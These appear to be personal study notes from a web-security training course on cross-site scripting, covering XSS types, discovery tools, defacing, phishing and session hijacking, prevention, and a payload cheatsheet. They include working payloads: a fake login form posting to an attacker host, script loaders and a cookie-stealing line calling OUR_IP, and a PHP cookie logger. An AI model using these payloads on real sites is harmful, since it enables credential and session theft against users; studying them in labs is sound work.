# Cross-Site Scripting (XSS)

Types:
- Persistent 
	- Stored XSS -> stored in backend db and displayed upon retrieval
		- Example: post, comments
- Non-Persistent
	- Reflected XSS -> when user input is displayed on page after being processed by server, but not stored in db
		- Example: search result, error message
	- DOM XSS -> user input directly shown in browser without reach backend server
		- Example: through client side http param/anchor tags

**Tip:** ==Many modern web applications utilize cross-domain IFrames to handle user input==, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of `window.origin` in the alert box, instead of a static value like `1`. In this case, the alert box would reveal the URL it is being executed on, and will confirm which form is the vulnerable one, in case an IFrame was being used.

## Stored XSS

Udah tau

## Reflected XSS

- Since our payload is wrapped with a `<script>` tag, it does not get rendered by the browser, so we get empty single quotes `''` instead
- But if the XSS vulnerability is Non-Persistent, how would we target victims with it? If the url is GET request like `http://a.com?message=<script>alert()</script>` we can get victim to click the link
- Once the victim visits this URL, the XSS payload would execute

## DOM XSS

While `reflected XSS` sends the input data to the back-end server through HTTP requests, DOM XSS is completely processed on the client-side through JavaScript. DOM XSS occurs when JavaScript is used to change the page source through the `Document Object Model (DOM)`.

Source & Sink:
- Source: JS object that takes user input
- Sink: function that writes user input to DOM object on page. If sink doesn't properly sanitize the input, it would be vulnerable to XSS
	- Common JS functions: `document.write()`, `DOM.innerHTML`, `DOM.outerHTML`
	- jQuery: `add()`, `after()`, `append()`
- ==innerHTML function does not allow the use of `<script>` tags== with it as security feature, but it can use
	- `<img src="" onerror=alert(window.origin)>`

## XSS Discovery

- Automatic
	Almost all Web Application Vulnerability Scanners (like [Nessus](https://www.tenable.com/products/nessus), [Burp Pro](https://portswigger.net/burp/pro), or [ZAP](https://www.zaproxy.org/)) have various capabilities for detecting all three types of XSS vulnerabilities.
	- Passive Scan, which reviews client-side code for potential DOM-based vulnerabilities
	- Active Scan, which sends various types of payloads to attempt to trigger an XSS through payload injection in the page source
	Some of the common open-source tools that can assist us in XSS discovery are [XSS Strike](https://github.com/s0md3v/XSStrike), [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS), and [XSSer](https://github.com/epsylon/xsser)
- Manual
	- XSS Payloads: [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md), [PayloadBox](https://github.com/payloadbox/xss-payload-list)
	- Note: XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).
	- It may be more efficient to write our own Python script to automate sending these payloads and then comparing the page source to see how our payloads were rendered

## XSS Attacks

### Defacing

Four HTML elements are usually utilized to change the main look of a web page:
- Background Color `document.body.style.background`
- Background `document.body.background`
- Page Title `document.title`
- Page Text `DOM.innerHTML`

Example:

```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
```


### Phishing

Self-explanatory, trap client by by creating form that sends the request to our server

```js
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

Listen

```sh
nc -lvnp 80
```

### Session Hijacking

Blind XSS = occurs when the vulnerability is triggered on a page we don't have access to.

How would we be able to detect an XSS vulnerability if we cannot see how the output is handled?

We can use the same trick we used in the previous section, which is to use a JavaScript payload that sends an HTTP request back to our server. If the JavaScript code gets executed, we will get a response on our machine, and we will know that the page is indeed vulnerable.

Check the vulnerable input first. Some candidates (check from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss))

```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

Examples in each input form

```html
<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
<script src=http://OUR_IP/username></script> #this goes inside the username field
```

Start server

```sh
sudo php -S 0.0.0.0:80
```

Create `script.js` in server directory

```js
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

Create `index.php` in server directory

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Send the payload to vulnerable input

```html
<script src=http://OUR_IP/script.js></script>
```

## XSS Prevention

1. Frontend
	1. Input validation
	2. Input sanitization
	3. Never use direct input
2. Backend
	1. Input validation
	2. Input sanitization
	3. Output HTML encoding
	4. Server configuration
		1. Using HTTPS across the entire domain.
		2. Using XSS prevention headers.
		3. Using the appropriate Content-Type for the page, like X-Content-Type-Options=nosniff.
		4. Using Content-Security-Policy options, like script-src 'self', which only allows locally hosted scripts.
		5. Using the HttpOnly and Secure cookie flags to prevent JavaScript from reading cookies and only transport them over HTTPS.
3. WAF

# Cheatsheets

| Code                                                                                          | Description                       |
| --------------------------------------------------------------------------------------------- | --------------------------------- |
| **XSS Payloads**                                                                              |                                   |
| `<script>alert(window.origin)</script>`                                                       | Basic XSS Payload                 |
| `<plaintext>`                                                                                 | Basic XSS Payload                 |
| `<script>print()</script>`                                                                    | Basic XSS Payload                 |
| `<img src="" onerror=alert(window.origin)>`                                                   | HTML-based XSS Payload            |
| `<script>document.body.style.background = "#141d2b"</script>`                                 | Change Background Color           |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image           |
| `<script>document.title = 'HackTheBox Academy'</script>`                                      | Change Website Title              |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`                | Overwrite website's main body     |
| `<script>document.getElementById('urlform').remove();</script>`                               | Remove certain HTML element       |
| `<script src="http://OUR_IP/script.js"></script>`                                             | Load remote script                |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`               | Send Cookie details to us         |
| **Commands**                                                                                  |                                   |
| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`                           | Run `xsstrike` on a url parameter |
| `sudo nc -lvnp 80`                                                                            | Start `netcat` listener           |
| `sudo php -S 0.0.0.0:80`                                                                      | Start `PHP` server                |
